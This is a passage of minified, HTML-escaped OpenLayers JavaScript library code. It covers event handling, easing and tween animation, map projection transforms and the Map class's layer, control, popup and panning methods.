b=OpenLayers.Util.pagePosition(c),d=OpenLayers.Util.getViewportElement(),e=window.pageYOffset||d.scrollTop;b[0]-=window.pageXOffset||d.scrollLeft;b[1]-=e;this.target.triggerEvent("buttonclick",&#123;buttonElement:c,buttonXY:&#123;x:this.startEvt.clientX-b[0],y:this.startEvt.clientY-b[1]&#125;&#125;)&#125;this.cancelRegEx.test(a.type)&amp;&amp;delete this.startEvt;OpenLayers.Event.stop(a);b=!1&#125;this.startRegEx.test(a.type)&amp;&amp;(this.startEvt=a,OpenLayers.Event.stop(a),b=!1)&#125;else b=!this.ignore(OpenLayers.Event.element(a)),delete this.startEvt;return b&#125;&#125;);OpenLayers.Util=OpenLayers.Util||&#123;&#125;;OpenLayers.Util.vendorPrefix=function()&#123;function a(a)&#123;return a?a.replace(/([A-Z])/g,function(a)&#123;return"-"+a.toLowerCase()&#125;).replace(/^ms-/,"-ms-"):null&#125;function b(a,b)&#123;if(void 0===g[b])&#123;var c,e=0,f=d.length,p="undefined"!==typeof a.cssText;for(g[b]=null;e&lt;f;e++)if((c=d[e])?(p||(c=c.toLowerCase()),c=c+b.charAt(0).toUpperCase()+b.slice(1)):c=b,void 0!==a[c])&#123;g[b]=c;break&#125;&#125;return g[b]&#125;function c(a)&#123;return b(e,a)&#125;var d=["","O","ms","Moz","Webkit"],e=document.createElement("div").style,f=&#123;&#125;,g=&#123;&#125;;return&#123;css:function(b)&#123;if(void 0===f[b])&#123;var d=b.replace(/(-[\s\S])/g,function(a)&#123;return a.charAt(1).toUpperCase()&#125;),d=c(d);f[b]=a(d)&#125;return f[b]&#125;,js:b,style:c,cssCache:f,jsCache:g&#125;&#125;();OpenLayers.Animation=function(a)&#123;var b=OpenLayers.Util.vendorPrefix.js(a,"requestAnimationFrame"),c=!!b,d=function()&#123;var c=a[b]||function(b,c)&#123;a.setTimeout(b,16)&#125;;return function(b,d)&#123;c.apply(a,[b,d])&#125;&#125;(),e=0,f=&#123;&#125;;return&#123;isNative:c,requestFrame:d,start:function(a,b,c)&#123;b=0&lt;b?b:Number.POSITIVE_INFINITY;var l=++e,m=+new Date;f[l]=function()&#123;f[l]&amp;&amp;+new Date-m&lt;=b?(a(),f[l]&amp;&amp;d(f[l],c)):delete f[l]&#125;;d(f[l],c);return l&#125;,stop:function(a)&#123;delete f[a]&#125;&#125;&#125;(window);OpenLayers.Tween=OpenLayers.Class(&#123;easing:null,begin:null,finish:null,duration:null,callbacks:null,time:null,minFrameRate:null,startTime:null,animationId:null,playing:!1,initialize:function(a)&#123;this.easing=a?a:OpenLayers.Easing.Expo.easeOut&#125;,start:function(a,b,c,d)&#123;this.playing=!0;this.begin=a;this.finish=b;this.duration=c;this.callbacks=d.callbacks;this.minFrameRate=d.minFrameRate||30;this.time=0;this.startTime=(new Date).getTime();OpenLayers.Animation.stop(this.animationId);this.animationId=null;this.callbacks&amp;&amp;this.callbacks.start&amp;&amp;this.callbacks.start.call(this,this.begin);this.animationId=OpenLayers.Animation.start(OpenLayers.Function.bind(this.play,this))&#125;,stop:function()&#123;this.playing&amp;&amp;(this.callbacks&amp;&amp;this.callbacks.done&amp;&amp;this.callbacks.done.call(this,this.finish),OpenLayers.Animation.stop(this.animationId),this.animationId=null,this.playing=!1)&#125;,play:function()&#123;var a=&#123;&#125;,b;for(b in this.begin)&#123;var c=this.begin[b],d=this.finish[b];if(null==c||null==d||isNaN(c)||isNaN(d))throw new TypeError("invalid value for Tween");a[b]=this.easing.apply(this,[this.time,c,d-c,this.duration])&#125;this.time++;this.callbacks&amp;&amp;this.callbacks.eachStep&amp;&amp;((new Date).getTime()-this.startTime)/this.time&lt;=1E3/this.minFrameRate&amp;&amp;this.callbacks.eachStep.call(this,a);this.time&gt;this.duration&amp;&amp;this.stop()&#125;,CLASS_NAME:"OpenLayers.Tween"&#125;);OpenLayers.Easing=&#123;CLASS_NAME:"OpenLayers.Easing"&#125;;OpenLayers.Easing.Linear=&#123;easeIn:function(a,b,c,d)&#123;return c*a/d+b&#125;,easeOut:function(a,b,c,d)&#123;return c*a/d+b&#125;,easeInOut:function(a,b,c,d)&#123;return c*a/d+b&#125;,CLASS_NAME:"OpenLayers.Easing.Linear"&#125;;OpenLayers.Easing.Expo=&#123;easeIn:function(a,b,c,d)&#123;return 0==a?b:c*Math.pow(2,10*(a/d-1))+b&#125;,easeOut:function(a,b,c,d)&#123;return a==d?b+c:c*(-Math.pow(2,-10*a/d)+1)+b&#125;,easeInOut:function(a,b,c,d)&#123;return 0==a?b:a==d?b+c:1&gt;(a/=d/2)?c/2*Math.pow(2,10*(a-1))+b:c/2*(-Math.pow(2,-10*--a)+2)+b&#125;,CLASS_NAME:"OpenLayers.Easing.Expo"&#125;;OpenLayers.Easing.Quad=&#123;easeIn:function(a,b,c,d)&#123;return c*(a/=d)*a+b&#125;,easeOut:function(a,b,c,d)&#123;return-c*(a/=d)*(a-2)+b&#125;,easeInOut:function(a,b,c,d)&#123;return 1&gt;(a/=d/2)?c/2*a*a+b:-c/2*(--a*(a-2)-1)+b&#125;,CLASS_NAME:"OpenLayers.Easing.Quad"&#125;;OpenLayers.Projection=OpenLayers.Class(&#123;proj:null,projCode:null,titleRegEx:/\+title=[^\+]*/,initialize:function(a,b)&#123;OpenLayers.Util.extend(this,b);this.projCode=a;"object"==typeof Proj4js&amp;&amp;(this.proj=new Proj4js.Proj(a))&#125;,getCode:function()&#123;return this.proj?this.proj.srsCode:this.projCode&#125;,getUnits:function()&#123;return this.proj?this.proj.units:null&#125;,toString:function()&#123;return this.getCode()&#125;,equals:function(a)&#123;var b=!1;a&amp;&amp;(a instanceof OpenLayers.Projection||(a=new OpenLayers.Projection(a)),"object"==typeof Proj4js&amp;&amp;this.proj.defData&amp;&amp;a.proj.defData?b=this.proj.defData.replace(this.titleRegEx,"")==a.proj.defData.replace(this.titleRegEx,""):a.getCode&amp;&amp;(b=this.getCode(),a=a.getCode(),b=b==a||!!OpenLayers.Projection.transforms[b]&amp;&amp;OpenLayers.Projection.transforms[b][a]===OpenLayers.Projection.nullTransform));return b&#125;,destroy:function()&#123;delete this.proj;delete this.projCode&#125;,CLASS_NAME:"OpenLayers.Projection"&#125;);OpenLayers.Projection.transforms=&#123;&#125;;OpenLayers.Projection.defaults=&#123;"EPSG:4326":&#123;units:"degrees",maxExtent:[-180,-90,180,90],yx:!0&#125;,"CRS:84":&#123;units:"degrees",maxExtent:[-180,-90,180,90]&#125;,"EPSG:900913":&#123;units:"m",maxExtent:[-2.003750834E7,-2.003750834E7,2.003750834E7,2.003750834E7]&#125;&#125;;OpenLayers.Projection.addTransform=function(a,b,c)&#123;if(c===OpenLayers.Projection.nullTransform)&#123;var d=OpenLayers.Projection.defaults[a];d&amp;&amp;!OpenLayers.Projection.defaults[b]&amp;&amp;(OpenLayers.Projection.defaults[b]=d)&#125;OpenLayers.Projection.transforms[a]||(OpenLayers.Projection.transforms[a]=&#123;&#125;);OpenLayers.Projection.transforms[a][b]=c&#125;;OpenLayers.Projection.transform=function(a,b,c)&#123;if(b&amp;&amp;c)if(b instanceof OpenLayers.Projection||(b=new OpenLayers.Projection(b)),c instanceof OpenLayers.Projection||(c=new OpenLayers.Projection(c)),b.proj&amp;&amp;c.proj)a=Proj4js.transform(b.proj,c.proj,a);else&#123;b=b.getCode();c=c.getCode();var d=OpenLayers.Projection.transforms;if(d[b]&amp;&amp;d[b][c])d[b][c](a)&#125;return a&#125;;OpenLayers.Projection.nullTransform=function(a)&#123;return a&#125;;(function()&#123;function a(a)&#123;a.x=180*a.x/d;a.y=180/Math.PI*(2*Math.atan(Math.exp(a.y/d*Math.PI))-Math.PI/2);return a&#125;function b(a)&#123;a.x=a.x*d/180;var b=Math.log(Math.tan((90+a.y)*Math.PI/360))/Math.PI*d;a.y=Math.max(-2.003750834E7,Math.min(b,2.003750834E7));return a&#125;function c(c,d)&#123;var e=OpenLayers.Projection.addTransform,f=OpenLayers.Projection.nullTransform,g,p,q,r,s;g=0;for(p=d.length;g&lt;p;++g)for(q=d[g],e(c,q,b),e(q,c,a),s=g+1;s&lt;p;++s)r=d[s],e(q,r,f),e(r,q,f)&#125;var d=2.003750834E7,e=["EPSG:900913","EPSG:3857","EPSG:102113","EPSG:102100"],f=["CRS:84","urn:ogc:def:crs:EPSG:6.6:4326","EPSG:4326"],g;for(g=e.length-1;0&lt;=g;--g)c(e[g],f);for(g=f.length-1;0&lt;=g;--g)c(f[g],e)&#125;)();OpenLayers.Map=OpenLayers.Class(&#123;Z_INDEX_BASE:&#123;BaseLayer:100,Overlay:325,Feature:725,Popup:750,Control:1E3&#125;,id:null,fractionalZoom:!1,events:null,allOverlays:!1,div:null,dragging:!1,size:null,viewPortDiv:null,layerContainerOrigin:null,layerContainerDiv:null,layers:null,controls:null,popups:null,baseLayer:null,center:null,resolution:null,zoom:0,panRatio:1.5,options:null,tileSize:null,projection:"EPSG:4326",units:null,resolutions:null,maxResolution:null,minResolution:null,maxScale:null,minScale:null,maxExtent:null,minExtent:null,restrictedExtent:null,numZoomLevels:16,theme:null,displayProjection:null,fallThrough:!1,autoUpdateSize:!0,eventListeners:null,panTween:null,panMethod:OpenLayers.Easing.Expo.easeOut,panDuration:50,zoomTween:null,zoomMethod:OpenLayers.Easing.Quad.easeOut,zoomDuration:20,paddingForPopups:null,layerContainerOriginPx:null,minPx:null,maxPx:null,initialize:function(a,b)&#123;1===arguments.length&amp;&amp;"object"===typeof a&amp;&amp;(a=(b=a)&amp;&amp;b.div);this.tileSize=new OpenLayers.Size(OpenLayers.Map.TILE_WIDTH,OpenLayers.Map.TILE_HEIGHT);this.paddingForPopups=new OpenLayers.Bounds(15,15,15,15);this.theme=OpenLayers._getScriptLocation()+"theme/default/style.css";this.options=OpenLayers.Util.extend(&#123;&#125;,b);OpenLayers.Util.extend(this,b);OpenLayers.Util.applyDefaults(this,OpenLayers.Projection.defaults[this.projection instanceof OpenLayers.Projection?this.projection.projCode:this.projection]);!this.maxExtent||this.maxExtent instanceof OpenLayers.Bounds||(this.maxExtent=new OpenLayers.Bounds(this.maxExtent));!this.minExtent||this.minExtent instanceof OpenLayers.Bounds||(this.minExtent=new OpenLayers.Bounds(this.minExtent));!this.restrictedExtent||this.restrictedExtent instanceof OpenLayers.Bounds||(this.restrictedExtent=new OpenLayers.Bounds(this.restrictedExtent));!this.center||this.center instanceof OpenLayers.LonLat||(this.center=new OpenLayers.LonLat(this.center));this.layers=[];this.id=OpenLayers.Util.createUniqueID("OpenLayers.Map_");this.div=OpenLayers.Util.getElement(a);this.div||(this.div=document.createElement("div"),this.div.style.height="1px",this.div.style.width="1px");OpenLayers.Element.addClass(this.div,"olMap");var c=this.id+"_OpenLayers_ViewPort";this.viewPortDiv=OpenLayers.Util.createDiv(c,null,null,null,"relative",null,"hidden");this.viewPortDiv.style.width="100%";this.viewPortDiv.style.height="100%";this.viewPortDiv.className="olMapViewport";this.div.appendChild(this.viewPortDiv);this.events=new OpenLayers.Events(this,this.viewPortDiv,null,this.fallThrough,&#123;includeXY:!0&#125;);OpenLayers.TileManager&amp;&amp;null!==this.tileManager&amp;&amp;(this.tileManager instanceof OpenLayers.TileManager||(this.tileManager=new OpenLayers.TileManager(this.tileManager)),this.tileManager.addMap(this));c=this.id+"_OpenLayers_Container";this.layerContainerDiv=OpenLayers.Util.createDiv(c);this.layerContainerDiv.style.zIndex=this.Z_INDEX_BASE.Popup-1;this.layerContainerOriginPx=&#123;x:0,y:0&#125;;this.applyTransform();this.viewPortDiv.appendChild(this.layerContainerDiv);this.updateSize();if(this.eventListeners instanceof Object)this.events.on(this.eventListeners);!0===this.autoUpdateSize&amp;&amp;(this.updateSizeDestroy=OpenLayers.Function.bind(this.updateSize,this),OpenLayers.Event.observe(window,"resize",this.updateSizeDestroy));if(this.theme)&#123;for(var c=!0,d=document.getElementsByTagName("link"),e=0,f=d.length;e&lt;f;++e)if(OpenLayers.Util.isEquivalentUrl(d.item(e).href,this.theme))&#123;c=!1;break&#125;c&amp;&amp;(c=document.createElement("link"),c.setAttribute("rel","stylesheet"),c.setAttribute("type","text/css"),c.setAttribute("href",this.theme),document.getElementsByTagName("head")[0].appendChild(c))&#125;null==this.controls&amp;&amp;(this.controls=[],null!=OpenLayers.Control&amp;&amp;(OpenLayers.Control.Navigation?this.controls.push(new OpenLayers.Control.Navigation):OpenLayers.Control.TouchNavigation&amp;&amp;this.controls.push(new OpenLayers.Control.TouchNavigation),OpenLayers.Control.Zoom?this.controls.push(new OpenLayers.Control.Zoom):OpenLayers.Control.PanZoom&amp;&amp;this.controls.push(new OpenLayers.Control.PanZoom),OpenLayers.Control.ArgParser&amp;&amp;this.controls.push(new OpenLayers.Control.ArgParser),OpenLayers.Control.Attribution&amp;&amp;this.controls.push(new OpenLayers.Control.Attribution)));e=0;for(f=this.controls.length;e&lt;f;e++)this.addControlToMap(this.controls[e]);this.popups=[];this.unloadDestroy=OpenLayers.Function.bind(this.destroy,this);OpenLayers.Event.observe(window,"unload",this.unloadDestroy);b&amp;&amp;b.layers&amp;&amp;(delete this.center,delete this.zoom,this.addLayers(b.layers),b.center&amp;&amp;!this.getCenter()&amp;&amp;this.setCenter(b.center,b.zoom));this.panMethod&amp;&amp;(this.panTween=new OpenLayers.Tween(this.panMethod));this.zoomMethod&amp;&amp;this.applyTransform.transform&amp;&amp;(this.zoomTween=new OpenLayers.Tween(this.zoomMethod))&#125;,getViewport:function()&#123;return this.viewPortDiv&#125;,render:function(a)&#123;this.div=OpenLayers.Util.getElement(a);OpenLayers.Element.addClass(this.div,"olMap");this.viewPortDiv.parentNode.removeChild(this.viewPortDiv);this.div.appendChild(this.viewPortDiv);this.updateSize()&#125;,unloadDestroy:null,updateSizeDestroy:null,destroy:function()&#123;if(!this.unloadDestroy)return!1;this.panTween&amp;&amp;(this.panTween.stop(),this.panTween=null);this.zoomTween&amp;&amp;(this.zoomTween.stop(),this.zoomTween=null);OpenLayers.Event.stopObserving(window,"unload",this.unloadDestroy);this.unloadDestroy=null;this.updateSizeDestroy&amp;&amp;OpenLayers.Event.stopObserving(window,"resize",this.updateSizeDestroy);this.paddingForPopups=null;if(null!=this.controls)&#123;for(var a=this.controls.length-1;0&lt;=a;--a)this.controls[a].destroy();this.controls=null&#125;if(null!=this.layers)&#123;for(a=this.layers.length-1;0&lt;=a;--a)this.layers[a].destroy(!1);this.layers=null&#125;this.viewPortDiv&amp;&amp;this.viewPortDiv.parentNode&amp;&amp;this.viewPortDiv.parentNode.removeChild(this.viewPortDiv);this.viewPortDiv=null;this.tileManager&amp;&amp;(this.tileManager.removeMap(this),this.tileManager=null);this.eventListeners&amp;&amp;(this.events.un(this.eventListeners),this.eventListeners=null);this.events.destroy();this.options=this.events=null&#125;,setOptions:function(a)&#123;var b=this.minPx&amp;&amp;a.restrictedExtent!=this.restrictedExtent;OpenLayers.Util.extend(this,a);b&amp;&amp;this.moveTo(this.getCachedCenter(),this.zoom,&#123;forceZoomChange:!0&#125;)&#125;,getTileSize:function()&#123;return this.tileSize&#125;,getBy:function(a,b,c)&#123;var d="function"==typeof c.test;return OpenLayers.Array.filter(this[a],function(a)&#123;return a[b]==c||d&amp;&amp;c.test(a[b])&#125;)&#125;,getLayersBy:function(a,b)&#123;return this.getBy("layers",a,b)&#125;,getLayersByName:function(a)&#123;return this.getLayersBy("name",a)&#125;,getLayersByClass:function(a)&#123;return this.getLayersBy("CLASS_NAME",a)&#125;,getControlsBy:function(a,b)&#123;return this.getBy("controls",a,b)&#125;,getControlsByClass:function(a)&#123;return this.getControlsBy("CLASS_NAME",a)&#125;,getLayer:function(a)&#123;for(var b=null,c=0,d=this.layers.length;c&lt;d;c++)&#123;var e=this.layers[c];if(e.id==a)&#123;b=e;break&#125;&#125;return b&#125;,setLayerZIndex:function(a,b)&#123;a.setZIndex(this.Z_INDEX_BASE[a.isBaseLayer?"BaseLayer":"Overlay"]+5*b)&#125;,resetLayersZIndex:function()&#123;for(var a=0,b=this.layers.length;a&lt;b;a++)this.setLayerZIndex(this.layers[a],a)&#125;,addLayer:function(a)&#123;for(var b=0,c=this.layers.length;b&lt;c;b++)if(this.layers[b]==a)return!1;if(!1===this.events.triggerEvent("preaddlayer",&#123;layer:a&#125;))return!1;this.allOverlays&amp;&amp;(a.isBaseLayer=!1);a.div.className="olLayerDiv";a.div.style.overflow="";this.setLayerZIndex(a,this.layers.length);a.isFixed?this.viewPortDiv.appendChild(a.div):this.layerContainerDiv.appendChild(a.div);this.layers.push(a);a.setMap(this);a.isBaseLayer||this.allOverlays&amp;&amp;!this.baseLayer?null==this.baseLayer?this.setBaseLayer(a):a.setVisibility(!1):a.redraw();this.events.triggerEvent("addlayer",&#123;layer:a&#125;);a.events.triggerEvent("added",&#123;map:this,layer:a&#125;);a.afterAdd();return!0&#125;,addLayers:function(a)&#123;for(var b=0,c=a.length;b&lt;c;b++)this.addLayer(a[b])&#125;,removeLayer:function(a,b)&#123;if(!1!==this.events.triggerEvent("preremovelayer",&#123;layer:a&#125;))&#123;null==b&amp;&amp;(b=!0);a.isFixed?this.viewPortDiv.removeChild(a.div):this.layerContainerDiv.removeChild(a.div);OpenLayers.Util.removeItem(this.layers,a);a.removeMap(this);a.map=null;if(this.baseLayer==a&amp;&amp;(this.baseLayer=null,b))for(var c=0,d=this.layers.length;c&lt;d;c++)&#123;var e=this.layers[c];if(e.isBaseLayer||this.allOverlays)&#123;this.setBaseLayer(e);break&#125;&#125;this.resetLayersZIndex();this.events.triggerEvent("removelayer",&#123;layer:a&#125;);a.events.triggerEvent("removed",&#123;map:this,layer:a&#125;)&#125;&#125;,getNumLayers:function()&#123;return this.layers.length&#125;,getLayerIndex:function(a)&#123;return OpenLayers.Util.indexOf(this.layers,a)&#125;,setLayerIndex:function(a,b)&#123;var c=this.getLayerIndex(a);0&gt;b?b=0:b&gt;this.layers.length&amp;&amp;(b=this.layers.length);if(c!=b)&#123;this.layers.splice(c,1);this.layers.splice(b,0,a);for(var c=0,d=this.layers.length;c&lt;d;c++)this.setLayerZIndex(this.layers[c],c);this.events.triggerEvent("changelayer",&#123;layer:a,property:"order"&#125;);this.allOverlays&amp;&amp;(0===b?this.setBaseLayer(a):this.baseLayer!==this.layers[0]&amp;&amp;this.setBaseLayer(this.layers[0]))&#125;&#125;,raiseLayer:function(a,b)&#123;var c=this.getLayerIndex(a)+b;this.setLayerIndex(a,c)&#125;,setBaseLayer:function(a)&#123;if(a!=this.baseLayer&amp;&amp;-1!=OpenLayers.Util.indexOf(this.layers,a))&#123;var b=this.getCachedCenter(),c=OpenLayers.Util.getResolutionFromScale(this.getScale(),a.units);null==this.baseLayer||this.allOverlays||this.baseLayer.setVisibility(!1);this.baseLayer=a;if(!this.allOverlays||this.baseLayer.visibility)this.baseLayer.setVisibility(!0),!1===this.baseLayer.inRange&amp;&amp;this.baseLayer.redraw();null!=b&amp;&amp;(a=this.getZoomForResolution(c||this.resolution,!0),this.setCenter(b,a,!1,!0));this.events.triggerEvent("changebaselayer",&#123;layer:this.baseLayer&#125;)&#125;&#125;,addControl:function(a,b)&#123;this.controls.push(a);this.addControlToMap(a,b)&#125;,addControls:function(a,b)&#123;for(var c=1===arguments.length?[]:b,d=0,e=a.length;d&lt;e;d++)this.addControl(a[d],c[d]?c[d]:null)&#125;,addControlToMap:function(a,b)&#123;a.outsideViewport=null!=a.div;this.displayProjection&amp;&amp;!a.displayProjection&amp;&amp;(a.displayProjection=this.displayProjection);a.setMap(this);var c=a.draw(b);c&amp;&amp;!a.outsideViewport&amp;&amp;(c.style.zIndex=this.Z_INDEX_BASE.Control+this.controls.length,this.viewPortDiv.appendChild(c));a.autoActivate&amp;&amp;a.activate()&#125;,getControl:function(a)&#123;for(var b=null,c=0,d=this.controls.length;c&lt;d;c++)&#123;var e=this.controls[c];if(e.id==a)&#123;b=e;break&#125;&#125;return b&#125;,removeControl:function(a)&#123;a&amp;&amp;a==this.getControl(a.id)&amp;&amp;(a.div&amp;&amp;a.div.parentNode==this.viewPortDiv&amp;&amp;this.viewPortDiv.removeChild(a.div),OpenLayers.Util.removeItem(this.controls,a))&#125;,addPopup:function(a,b)&#123;if(b)for(var c=this.popups.length-1;0&lt;=c;--c)this.removePopup(this.popups[c]);a.map=this;this.popups.push(a);if(c=a.draw())c.style.zIndex=this.Z_INDEX_BASE.Popup+this.popups.length,this.layerContainerDiv.appendChild(c)&#125;,removePopup:function(a)&#123;OpenLayers.Util.removeItem(this.popups,a);if(a.div)try&#123;this.layerContainerDiv.removeChild(a.div)&#125;catch(b)&#123;&#125;a.map=null&#125;,getSize:function()&#123;var a=null;null!=this.size&amp;&amp;(a=this.size.clone());return a&#125;,updateSize:function()&#123;var a=this.getCurrentSize();if(a&amp;&amp;!isNaN(a.h)&amp;&amp;!isNaN(a.w))&#123;this.events.clearMouseCache();var b=this.getSize();null==b&amp;&amp;(this.size=b=a);if(!a.equals(b))&#123;this.size=a;a=0;for(b=this.layers.length;a&lt;b;a++)this.layers[a].onMapResize();a=this.getCachedCenter();null!=this.baseLayer&amp;&amp;null!=a&amp;&amp;(b=this.getZoom(),this.zoom=null,this.setCenter(a,b))&#125;&#125;this.events.triggerEvent("updatesize")&#125;,getCurrentSize:function()&#123;var a=new OpenLayers.Size(this.div.clientWidth,this.div.clientHeight);if(0==a.w&amp;&amp;0==a.h||isNaN(a.w)&amp;&amp;isNaN(a.h))a.w=this.div.offsetWidth,a.h=this.div.offsetHeight;if(0==a.w&amp;&amp;0==a.h||isNaN(a.w)&amp;&amp;isNaN(a.h))a.w=parseInt(this.div.style.width),a.h=parseInt(this.div.style.height);return a&#125;,calculateBounds:function(a,b)&#123;var c=null;null==a&amp;&amp;(a=this.getCachedCenter());null==b&amp;&amp;(b=this.getResolution());if(null!=a&amp;&amp;null!=b)var c=this.size.w*b/2,d=this.size.h*b/2,c=new OpenLayers.Bounds(a.lon-c,a.lat-d,a.lon+c,a.lat+d);return c&#125;,getCenter:function()&#123;var a=null,b=this.getCachedCenter();b&amp;&amp;(a=b.clone());return a&#125;,getCachedCenter:function()&#123;!this.center&amp;&amp;this.size&amp;&amp;(this.center=this.getLonLatFromViewPortPx(&#123;x:this.size.w/2,y:this.size.h/2&#125;));return this.center&#125;,getZoom:function()&#123;return this.zoom&#125;,pan:function(a,b,c)&#123;c=OpenLayers.Util.applyDefaults(c,&#123;animate:!0,dragging:!1&#125;);if(c.dragging)0==a&amp;&amp;0==b||this.moveByPx(a,b);else&#123;var d=this.getViewPortPxFromLonLat(this.getCachedCenter());a=d.add(a,b);if(this.dragging||!a.equals(d))d=this.getLonLatFromViewPortPx(a),c.animate?this.panTo(d):(this.moveTo(d),this.dragging&amp;&amp;(this.dragging=!1,this.events.triggerEvent("moveend")))&#125;&#125;,panTo:function(a)&#123;if(this.panTween&amp;&amp;this.getExtent().scale(this.panRatio).containsLonLat(a))&#123;var b=this.getCachedCenter();if(!a.equals(b))&#123;var b=this.getPixelFromLonLat(b),c=this.getPixelFromLonLat(a),d=0,e=0;this.panTween.start(&#123;x:0,y:0&#125;,&#123;x:c.x-b.x,y:c.y-b.y&#125;,this.panDuration,&#123;callbacks:&#123;eachStep:OpenLayers.Function.bind(function(a)&#123;this.moveByPx(a.x-d,a.y-e);d=Math.round(a.x);e=Math.round(a.y)&#125;,this),done:OpenLayers.Function.bind(function(b)&#123;this.moveTo(a);this.dragging=!1;this.events.triggerEvent("moveend")&#125;,this)&#125;&#125;)&#125;&#125;else this.setCenter(a)&#125;,setCenter:function(a,b,c,d)&#123;this.panTween&amp;&amp;this.panTween.stop();this.zoomTween&amp;&amp;this.zoomTween.stop();this.moveTo(a,b,&#123;dragging:c,forceZoomChange:d&#125;)&#125;,moveByPx:function(a,b)&#123;var c=this.size.w/2,d=this.size.h/2,e=c+a,f=d+b,g=this.baseLayer.wrapDateLine,h=0,k=0;this.restrictedExtent&amp;&amp;(h=c,k=d,g=!1);a=g||e&lt;=this.maxPx.x-h&amp;&amp;e&gt;=this.minPx.x+h?Math.round(a):0;b=f&lt;=this.maxPx.y-k&amp;&amp;f&gt;=this.minPx.y+k?Math.round(b):0;if(a||b)&#123;this.dragging||(this.dragging=!0,this.events.triggerEvent("movestart"));this.center=null;a&amp;&amp;(this.layerContainerOriginPx.x-=a,this.minPx.x-=a,this.maxPx.x-=a);b&amp;&amp;(this.layerContainerOriginPx.y-=b,this.minPx.y-=b,this.maxPx.y-=b);this.applyTransform();d=0;for(e=this.layers.length;d&lt;e;++d)c=this.layers[d],c.visibility&amp;&amp;(c===this.baseLayer||c.inRange)&amp;&amp;(c.moveByPx(a,b),c.events.triggerEvent("move"));this.events.triggerEvent("move")&#125;&#125;,adjustZoom:function(a)&#123;if(this.baseLayer&amp;&amp;this.baseLayer.wrapDateLine)&#123;var b=this.baseLayer.resolutions,c=this.getMaxExtent().getWidth()/this.size.w;if(this.getResolutionForZoom(a)&gt;c)if(this.fractionalZoom)a=this.getZoomForResolution(c);else for(var d=a|0,e=b.length;d&lt;e;++d)if(b[d]&lt;=c)&#123;a=d;break&#125;&#125;return a&#125;,getMinZoom:function()&#123;return this.adjustZoom(0)&#125;,moveTo:function(a,b,c)&#123;null==a||a instanceof OpenLayers.LonLat||(a=new OpenLayers.LonLat(a));c||(c=&#123;&#125;);null!=b&amp;&amp;(b=parseFloat(b),this.fractionalZoom||(b=Math.round(b)));var d=b;b=this.adjustZoom(b);b!==d&amp;&amp;(a=this.getCenter());var d=c.dragging||this.dragging,e=c.forceZoomChange;this.getCachedCenter()||this.isValidLonLat(a)||(a=this.maxExtent.getCenterLonLat(),this.center=a.clone());if(null!=this.restrictedExtent)&#123;null==a&amp;&amp;(a=this.center);null==b&amp;&amp;(b=this.getZoom());var f=this.getResolutionForZoom(b),f=this.calculateBounds(a,f);if(!this.restrictedExtent.containsBounds(f))&#123;var g=this.restrictedExtent.getCenterLonLat();f.getWidth()&gt;this.restrictedExtent.getWidth()?a=new OpenLayers.LonLat(g.lon,a.lat):f.left&lt;this.restrictedExtent.left?a=a.add(this.restrictedExtent.left-f.left,0):f.right&gt;this.restrictedExtent.right&amp;&amp;(a=a.add(this.restrictedExtent.right-f.right,0));f.getHeight()&gt;this.restrictedExtent.getHeight()?a=new OpenLayers.LonLat(a.lon,g.lat):f.bottom&lt;this.restrictedExtent.bottom?a=a.add(0,this.restrictedExtent.bottom-f.bottom):f.top&gt;this.restrictedExtent.top&amp;&amp;(a=a.add(0,this.restrictedExtent.top-f.top))&#125;&#125;e=e||this.isValidZoomLevel(b)&amp;&amp;b!=this.getZoom();f=this.isValidLonLat(a)&amp;&amp;!a.equals(this.center);if(e||f||d)&#123;d||this.events.triggerEvent("movestart",&#123;zoomChanged:e&#125;);f&amp;&amp;(!e&amp;&amp;this.center&amp;&amp;this.centerLayerContainer(a),this.center=a.clone());a=e?this.getResolutionForZoom(b):this.getResolution();if(e||null==this.layerContainerOrigin)&#123;this.layerContainerOrigin=this.getCachedCenter();this.layerContainerOriginPx.x=0;this.layerContainerOriginPx.y=0;this.applyTransform();var f=this.getMaxExtent(&#123;restricted:!0&#125;),h=f.getCenterLonLat(),g=this.center.lon-h.lon,h=h.lat-this.center.lat,k=Math.round(f.getWidth()/a),l=Math.round(f.getHeight()/a);this.minPx=&#123;x:(this.size.w-k)/2-g/a,y:(this.size.h-l)/2-h/a&#125;;this.maxPx=&#123;x:this.minPx.x+Math.round(f.getWidth()/a),y:this.minPx.y+Math.round(f.getHeight()/a)&#125;&#125;e&amp;&amp;(this.zoom=b,this.resolution=a);a=this.getExtent();this.baseLayer.visibility&amp;&amp;(this.baseLayer.moveTo(a,e,c.dragging),c.dragging||this.baseLayer.events.triggerEvent("moveend",&#123;zoomChanged:e&#125;));a=this.baseLayer.getExtent();for(b=this.layers.length-1;0&lt;=b;--b)f=this.layers[b],f===this.baseLayer||f.isBaseLayer||(g=f.calculateInRange(),f.inRange!=g&amp;&amp;((f.inRange=g)||f.display(!1),this.events.triggerEvent("changelayer",&#123;layer:f,property:"visibility"&#125;)),g&amp;&amp;f.visibility&amp;&amp;(f.moveTo(a,e,c.dragging),c.dragging||f.events.triggerEvent("moveend",&#123;zoomChanged:e&#125;)));this.events.triggerEvent("move");d||this.events.triggerEvent("moveend");if(e)&#123;b=0;for(c=this.popups.length;b&lt;c;b++)this.popups[b].updatePosition();this.events.triggerEvent("zoomend")&#125;&#125;&#125;,centerLayerContainer:function(a)&#123;var b=this.getViewPortPxFromLonLat(this.layerContainerOrigin),c=this.getViewPortPxFromLonLat(a);if(null!=b&amp;&amp;null!=c)&#123;var d=this.layerContainerOriginPx.x;a=this.layerContainerOriginPx.y;var e=Math.round(b.x-c.x),b=Math.round(b.y-c.y);this.applyTransform(this.layerContainerOriginPx.x=e,this.layerContainerOriginPx.y=b);d-=e;a-=b;this.minPx.x-=d;this.maxPx.x-=d;this.minPx.y-=a;this.maxPx.y-=a&#125;&#125;,isValidZoomLevel:function(a)&#123;return null!=a&amp;&amp;0&lt;=a&amp;&amp;a&lt;this.getNumZoomLevels()&#125;,isValidLonLat:function(a)&#123;var b=!1;null!=a&amp;&amp;(b=this.getMaxExtent(),b=b.containsLonLat(a,&#123;worldBounds:this.baseLayer.wrapDateLine&amp;&amp;b&#125;));return b&#125;,getProjection:function()&#123;var a=this.getProjectionObject();return a?a.getCode():null&#125;,getProjectionObject:function()&#123;var a=null;null!=this.baseLayer&amp;&amp;(a=this.baseLayer.projection);return a&#125;,getMaxResolution:function()&#123;var a=null;null!=this.baseLayer&amp;&amp;(a=this.baseLayer.maxResolution);return a&#125;,getMaxExtent:function(a)&#123;var 